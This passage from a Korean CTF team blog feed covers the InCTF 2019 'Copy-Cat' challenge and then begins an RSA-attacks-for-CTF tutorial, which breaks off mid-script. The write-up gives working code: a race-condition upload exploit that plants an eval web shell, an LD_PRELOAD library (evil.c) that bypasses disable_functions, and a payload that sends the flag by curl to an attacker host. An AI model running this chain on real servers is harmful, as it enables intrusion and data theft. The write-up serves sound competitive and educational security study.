$_SERVER[<span class="string">"REMOTE_ADDR"</span>] . <span class="string">"xxxisbackxxx"</span>);</span><br><span class="line">@mkdir($SANDBOX);</span><br><span class="line">@chdir($SANDBOX);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])) &#123;</span><br><span class="line">  ExtractZipFile($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $SANDBOX);</span><br><span class="line">  CheckDir($SANDBOX);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"File is at: "</span> . <span class="string">"/uploads/"</span> . md5(<span class="string">"xxSpyD3rxx"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>] . <span class="string">"xxxisbackxxx"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>functions.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">..생략..</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ExtractZipFile</span><span class="params">($file,$path)</span></span>&#123;</span><br><span class="line">  $zip = <span class="keyword">new</span> ZipArchive;</span><br><span class="line">  <span class="keyword">if</span> ($zip-&gt;open($file) === <span class="keyword">TRUE</span>) &#123;</span><br><span class="line">    $zip-&gt;extractTo($path);</span><br><span class="line">    $zip-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CheckDir</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    $files = scandir($path);</span><br><span class="line">    <span class="keyword">foreach</span> ($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        $filepath = <span class="string">"$path/$file"</span>;</span><br><span class="line">        <span class="keyword">if</span> (is_file($filepath)) &#123;</span><br><span class="line">            $parts = pathinfo($file);</span><br><span class="line">            $ext = strtolower($parts[<span class="string">'extension'</span>]);</span><br><span class="line">            <span class="keyword">if</span> (strpos($ext, <span class="string">'php'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'pl'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'py'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'cgi'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'asp'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'js'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'rb'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">strpos($ext, <span class="string">'htaccess'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'jar'</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">                @chmod($filepath, <span class="number">0666</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                @chmod($filepath, <span class="number">0666</span>);    <span class="comment">// just in case the unlink fails for some reason</span></span><br><span class="line">                unlink($filepath);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($file != <span class="string">'.'</span> &amp;&amp; $file != <span class="string">'..'</span> &amp;&amp; is_dir($filepath)) &#123;</span><br><span class="line">            CheckDir($filepath);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">..생략..</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>코드 흐름은 다음과 같습니다.</p><p>업로드한 Zip 파일 압축 해제 -&gt; ./uploads/md5_hex_value/ 디렉토리에 압축된 파일들 생성 -&gt; 생성된 파일들의 확장자를 검증해 필터 대상인 경우 삭제</p><p>위 흐름대로라면 <strong>파일 생성 후 삭제</strong>가 이루어지며, 생성될 <strong>파일명 및 경로가 고정</strong>되어 있기 때문에 <strong>Race Condition</strong>이 가능해 집니다.</p><p>이를 통해 파일 업로드 마다 삭제되는 <strong>php 확장자 파일 호출이 가능</strong>해지며, <strong>웹쉘 업로드</strong>가 가능해집니다.</p><p>Race Condition 시 사용한 코드는 아래와 같습니다.</p><p><strong>youngsin.php</strong> (해당 파일을 압축해 youngsin.zip 생성)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">mkdir(<span class="string">"../youngsin/"</span>);</span><br><span class="line">file_put_contents(<span class="string">"../youngsin/webshell.php"</span>,<span class="string">'&lt;?php eval($_GET[0]);?&gt;'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"WebShell Path = "</span>.getcwd().<span class="string">"/../youngsin/webshell.php"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>raceCondition.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_zip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">        url = <span class="string">"http://3.15.186.158/upload.php"</span></span><br><span class="line">        multiple_files = [</span><br><span class="line">            (<span class="string">'file'</span>, (<span class="string">'foo.png'</span>, open(<span class="string">'C:\Users\Administrator\Desktop/1/youngsin.zip'</span>,<span class="string">"rb"</span>), <span class="string">'application/x-zip-compressed'</span>))]</span><br><span class="line">        header = &#123;<span class="string">"Cookie"</span>:<span class="string">"PHPSESSID=2grnkh3472812hpf3jg4p2m5g6"</span>&#125;</span><br><span class="line">        result =  requests.post(url,headers=header,files=multiple_files).text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_shell</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">1000</span>):</span><br><span class="line">        url = <span class="string">"http://3.15.186.158/uploads/e8d8a3c4bd79dbe75be52c8328e2f1bb/youngsin.php"</span></span><br><span class="line">        header = &#123;<span class="string">"Cookie"</span>: <span class="string">"PHPSESSID=2grnkh3472812hpf3jg4p2m5g6"</span>&#125;</span><br><span class="line">        result = requests.get(url, headers=header).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"404 Not Found"</span> <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">print</span> result</span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    threading.Thread(target=upload_zip,args=(<span class="string">''</span>)).start()</span><br><span class="line">    threading.Thread(target=get_shell, args=(<span class="string">''</span>)).start()</span><br></pre></td></tr></table></figure><p>Result<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebShell Path = /var/www/html/uploads/e8d8a3c4bd79dbe75be52c8328e2f1bb/../youngsin/webshell.php</span><br></pre></td></tr></table></figure></p><p>생성된 웹쉘에 접근해보면 <strong>정상적으로 웹쉘이 업로드</strong>된걸 볼 수 있습니다.</p><p><img src="https://user-images.githubusercontent.com/39398965/65533542-cb17ad80-df38-11e9-9b9e-368db0463a8e.png" alt="image"></p><hr><p>이제 웹쉘까지 올렸겠다 그냥 플래그 파일 읽으면 될 것 같지만 <strong>플래그 파일의 권한이 오직 실행권한만 존재</strong>하기 때문에 <strong>단순 File Function으로는 플래그를 획득할 수 없고 쉘을 따야했습니다.</strong></p><p>그럼 이제 쉘을 따기위해 호출가능한 함수를 찾아야하는데 <strong><code>disable_functions</code></strong>이 다음과 같이 세팅되어 있었습니다.</p><p><strong>disable_functions</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,proc_open,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,mail,fread,fopen,file_get_contents,readfile,chdir</span><br></pre></td></tr></table></figure><p>일단 기본적으로 <strong>php에서 지원하는 모든 쉘 관련 함수가 막혀</strong>있는걸 볼 수 있었습니다. 추가로 시도해볼만한 <strong>LD_PRELOAD</strong>를 이용한 기법과 같은 경우  <strong>putenv는 활성화</strong> 되어있지만 내부적으로 <strong>execve를 호출</strong>하는걸로 알려져있는 <strong>mail,imap_open,error_log,syslog가 막혀</strong>있었고, <strong>imagick 모듈과 같은 경우 따로 설치되어 있지 않아 사용이 불가</strong>했습니다.</p><p>여기서 추가로 다른방법같은게 있나 유심히 phpinfo 페이지를 확인하다보면 <strong>mbstring라는 확장 모듈이 설치</strong>되어 있는걸 볼 수 있습니다.</p><p><img src="https://user-images.githubusercontent.com/39398965/65534295-18484f00-df3a-11e9-937d-4e9b29a2eab6.png" alt="image"></p><p>해당 모듈이 설치된 경우 <strong>Multibyte character encoding을 지원하는 함수들 사용이 가능</strong>한데, 사용 가능한 함수 중 아래와 같이 <strong>mail함수와 매칭되는 mb_send_mail이 존재</strong>합니다.</p><p><img src="https://user-images.githubusercontent.com/39398965/65534875-38c4d900-df3b-11e9-807a-fa6827ba3945.png" alt="image"></p><p>해당 함수와 같은 경우 인코딩 부분을 제외하곤 mail함수와 동일한 형태로 수행될 것이기 때문에 <strong>내부적으로 execve를 통한 sendmail 호출</strong>이 이루어지고, <strong>disable_function에는 적용이 되어있지 않아 LD_PRELOAD 기법을 통해 쉘 획득</strong>이 가능해집니다.</p><p>LD_PRELOAD를 통해 쉘을 획득하는 방식은 간단하게 설명하면 아래와 같습니다.</p><ol><li>execve를 오버라이딩하는 공유 라이브러리 생성 (ex: gcc -shared -fPIC evil.c -o evil.so)</li><li>so 파일 업로드</li><li>php의 putenv를 통해 업로드한 so 파일을 LD_PRELOAD로 등록</li><li>php에서 내부적으로 execve를 호출하는 함수(ex:mail,imap_open,error_log 등) 호출</li></ol><p>추가적으로 해당 기법에 대해 궁금하신분들은 구글에 <strong>php ld_preload bypass</strong> 와 같은 형태로 검색하시면 좋은 자료가 많으니 참고해주시면 될 것 같습니다.</p><p>위 공격과정을 수행할 코드는 아래와 같습니다.</p><p><strong>evil.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">u_int <span class="title">getuid</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *command;</span><br><span class="line">command = getenv(<span class="string">"youngsin"</span>);</span><br><span class="line">system(command);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <strong>php payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/uploads/youngsin/webshell.php?0=putenv(&quot;LD_PRELOAD=/tmp/evil.so&quot;);putenv(&quot;youngsin=curl http://my_ip:9996/ -d id=`/readFlag|base64|tr -d &apos;\n&apos;`&quot;);mb_send_mail(&quot;a&quot;,&quot;a&quot;,&quot;a&quot;);</span><br></pre></td></tr></table></figure><p>해당 Payload를 실행하게되면 공격자 서버로 전송된 Flag를 획득할 수 있습니다.</p><p><strong><code>Flag = inctf{Ohh,you_are_the_ultimate_chainer,Bypassing_disable_function_wasn&#39;t_fun?:SpyD3r}</code></strong></p><h1 id="레퍼런스"><a href="#레퍼런스" class="headerlink" title="레퍼런스"></a>레퍼런스</h1><p><a href="https://www.php.net/manual/en/mbstring.installation.php" target="_blank" rel="noopener">https://www.php.net/manual/en/mbstring.installation.php</a><br><a href="https://www.php.net/manual/en/function.mb-send-mail.php" target="_blank" rel="noopener">https://www.php.net/manual/en/function.mb-send-mail.php</a></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content:encoded>
      
      <comments>https://defenit.kr/2019/09/24/Web/%E3%84%B4%20WriteUps/InCTF_2019_Copy-Cat_Writeup/#disqus_thread</comments>
    </item>
    
    <item>
      <title>RSA for CTF</title>
      <link>https://defenit.kr/2019/09/24/Crypto/%E3%84%B4%20Research/RSA_for_CTF/</link>
      <guid>https://defenit.kr/2019/09/24/Crypto/%E3%84%B4%20Research/RSA_for_CTF/</guid>
      <pubDate>Tue, 24 Sep 2019 02:42:39 GMT</pubDate>
      <description>
      
        
        
          &lt;h3 id=&quot;목차&quot;&gt;&lt;a href=&quot;#목차&quot; class=&quot;headerlink&quot; title=&quot;목차&quot;&gt;&lt;/a&gt;목차&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;RSA Key Gen&lt;/li&gt;
&lt;li&gt;RSA 암호화 및 복호화&lt;ul&gt;
&lt;li&gt;암호화&lt;/li&gt;
&lt;li&gt;복호화&lt;/li&gt;
        
      
      </description>
      
      <content:encoded><![CDATA[<h3 id="목차"><a href="#목차" class="headerlink" title="목차"></a>목차</h3><ul><li>RSA Key Gen</li><li>RSA 암호화 및 복호화<ul><li>암호화</li><li>복호화</li></ul></li><li>RSA 문제 종류<ul><li>d값 계산</li><li>낮은 지수 공격</li><li>n값 소인수 분해 및 DB 이용</li><li>위너 공격</li><li>하스타드 공격</li><li>선택 암호문 공격</li><li>p, q값이 비슷할 경우 n 값으로 p, q값 구하기</li></ul></li><li>레퍼런스</li><li>문서 역사</li></ul><hr><h3 id="RSA-Key-Gen"><a href="#RSA-Key-Gen" class="headerlink" title="RSA Key Gen"></a>RSA Key Gen</h3><ol><li><p><strong>p, q 선택</strong></p><ul><li><p>python에선 다음과 같이 p, q를 생성할 수 있다.</p><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>) <span class="comment"># 1024bit</span></span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p><strong>n 계산</strong></p><ul><li><strong>p와 q를 곱하면 n</strong>이 된다.</li></ul></li><li><p><strong>phi 계산</strong></p><ul><li><strong>(p-1)과 (q-1)을 곱하면 phi</strong>가 된다. </li></ul></li><li><p><strong>e 선택</strong></p><ul><li><strong>주로 65537</strong></li><li><strong>phi와 서로소</strong>인 수</li></ul></li><li><p><strong>d 계산</strong></p><ul><li><p>d = <script type="math/tex">e^{-1}</script> mod n</p><ul><li><strong>mod phi에 대한 e의 곱셈의 역원</strong></li></ul></li><li><p>python에서 d값을 계산하는 방법은 두가지이다.</p><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>) <span class="comment"># Crypto.Util.number</span></span><br><span class="line">q = getPrime(<span class="number">1024</span>) <span class="comment"># Crypto.Util.number</span></span><br><span class="line">phi = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = invert(e, phi) <span class="comment"># gmpy2</span></span><br></pre></td></tr></table></figure></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>) <span class="comment"># Crypto.Util.number</span></span><br><span class="line">q = getPrime(<span class="number">1024</span>) <span class="comment"># Crypto.Util.number</span></span><br><span class="line">phi = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = divm(<span class="number">1</span>, e, phi) <span class="comment"># gmpy2</span></span><br></pre></td></tr></table></figure></li><li><p><code>invert</code>는 곱셈의 역원을 구해주고 <code>divm</code>의 첫 번째 인자를 1로 지정해주면 역원을 구해주는 기능을 한다. (곱셈의 역원이란 곱했을 때 1이 나오는 수를 의미한다.)</p></li></ul></li></ul></li></ol><p>​    <strong>공개키(public key)  : <code>(e,n)</code></strong></p><p>​    <strong>개인키(private key): <code>(d,n)</code></strong></p><hr><h3 id="RSA-암호화-및-복호화"><a href="#RSA-암호화-및-복호화" class="headerlink" title="RSA 암호화 및 복호화"></a>RSA 암호화 및 복호화</h3><ul><li>암호화<ul><li>암호문 = <script type="math/tex">평문^e</script> mod n</li></ul></li><li>복호화<ul><li>평문 = <script type="math/tex">암호문^d</script> mod n</li></ul></li></ul><hr><h3 id="RSA-문제-종류"><a href="#RSA-문제-종류" class="headerlink" title="RSA 문제 종류"></a>RSA 문제 종류</h3><ul><li><p><strong>d값 계산</strong></p><ul><li><strong>p, q, e 값 등이 주어졌을 경우</strong> n값과 phi 값을 계산 가능하기 때문에 d 값을 계산하면 된다.</li><li><p>gmpy2의 <code>invert</code>또는 <code>divm</code>를 사용한다.</p><ul><li><strong>d = invert(e, phi)</strong></li><li><strong>d = divm(1, e, phi)</strong></li></ul></li><li><p>예시 코드 (문제에서 p, q, e, c가 주어졌다고 가정)</p><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">e = </span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">phi = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line">d = invert(e, phi) <span class="comment"># d = divm(1, e, phi)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'%x'</span> % pow(c, d, n)).decode(<span class="string">"hex"</span>)</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><ul><li><p><strong>낮은 지수 공격</strong></p><ul><li><p><strong>e 값과 매우 작고 n 값이 큰 경우</strong> 가능한 공격 방법</p></li><li><p>보통 <code>e 값은 3</code>인데, <strong>암호문의 세제곱근을 구하면 평문</strong>이 된다.</p></li><li><p>gmpy2의 <code>iroot</code> 또는 <code>cbrt</code>를 사용한다.</p><ul><li><strong>m = iroot(c, 3)[0]</strong></li><li><strong>m = cbrt(c)</strong></li></ul></li><li><p>예시 코드 (문제에서 c, e값이 주어졌고 e 값이 3이라고 가정)</p><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> local_context() <span class="keyword">as</span> ctx:</span><br><span class="line">    ctx.precision = <span class="number">3000</span></span><br><span class="line">    m = cbrt(c)</span><br><span class="line">    <span class="comment">#m = iroot(c, 3)[0]</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'%x'</span> % int(m)).decode(<span class="string">"hex"</span>)</span><br></pre></td></tr></table></figure></li><li><p><code>cbrt</code>는 세제곱근을 구해주는 함수고 <code>iroot</code>의 두 번째 인자를 3으로 주면 세제곱근을 구해준다. 하지만 iroot의 반환 값은 튜플이고 원하는 값은 0번째 있는 값이다.</p></li><li><p><code>ctx.precision</code> 값은 <strong>정밀도</strong>에 관한 값인데 만약 <strong>결과 값이 재대로 나오지 않는다면 해당 값을 더 높게 수정해서 정밀도를 올려야 한다.</strong></p></li></ul></li></ul></li></ul><ul><li><p><strong>n값 소인수 분해 및 DB 이용</strong></p><ul><li><p><strong>작은 수의 n</strong>과 e만 주어졌을 경우 또는 <strong>DB에 존재하는 소수</strong>인 경우 가능한 공격 방법</p></li><li><p>d 값을 구하기 위해서 phi 값이 필요하고 phi를 구하기 위하여 p, q 값이 필요한데, <strong>n이 작다면 소인수 분해를 통해서 p, q값을 계산</strong> 가능하다.</p></li><li><p>매우 큰 소수라서 소인수 분해는 못하지만 DB에 존재하는 소수면 바로 p, q 값을 구할 수 있다.</p></li><li><p>주로 웹 사이트를 이용한다.</p><ul><li><p>[ <a href="http://www.factordb.com/" target="_blank" rel="noopener">http://www.factordb.com/</a> ]</p></li><li><p>[ <a href="https://www.alpertron.com.ar/ECMC.HTM" target="_blank" rel="noopener">https://www.alpertron.com.ar/ECMC.HTM</a> ]</p></li></ul></li></ul></li></ul><ul><li><p><strong>위너 공격</strong></p><ul><li><p><strong>e 값이 매우 큰경우</strong> 가능한 공격 방법</p></li><li><p>e 값이 큰 경우 d 값이 작을 확률이 높고 이때 성립한다.</p></li><li><p>위너 공격을 해주는 소스 코드를 이용해서 d 값을 알아낼 수 있다.</p><ul><li><a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="noopener">https://github.com/pablocelayes/rsa-wiener-attack</a></li><li><code>git clone https://github.com/pablocelayes/rsa-wiener-attack.git</code> 명령으로 위너 공격 코드를 다운 받고 <code>RSAwienerHacker.py</code>를 조금 수정해서 사용한다.</li></ul></li><li><p>예시 코드 (n, e, c 값이 주어졌다고 가정)</p><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># RSAwienerHacker.py</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    n = </span><br><span class="line">    e = </span><br><span class="line">    c = </span><br><span class="line">    d = hack_RSA(e, n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'%x'</span> % pow(c, d, n)).decode(<span class="string">"hex"</span>)</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><ul><li><p><strong>하스타드 공격</strong></p><ul><li><p><strong>n값과 c 값이 3개씩 주어 지며 e 값이 작은 경우</strong>에 가능한 공격 방법</p></li><li><p>e 값은 주로 3이다.</p></li><li><p>하스타드 공격을 해주는 소스 코드를 이용해서 평문을 알아낼 수 있다.</p></li><li><p>예시 코드 (e, n1, n2, n3, c1, c2, c3이 주어졌다고 가정)</p><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t        RSA Hastad Attack         "</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t         JulesDT -- 2016          "</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t         License GNU/GPL          "</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"</span></span><br><span 